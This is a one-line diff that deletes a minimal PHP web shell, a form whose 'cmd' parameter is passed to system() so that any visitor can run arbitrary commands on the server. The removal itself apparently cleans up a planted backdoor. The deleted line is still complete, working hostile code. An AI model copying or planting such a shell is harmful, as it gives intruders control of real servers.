@@ -1,1 +1,0 @@
-<form action='file.php'><input autofocus name='cmd'style='width:400px;height:400px'><br><?php $cmd=$_GET['cmd'];system($cmd); ?></form>
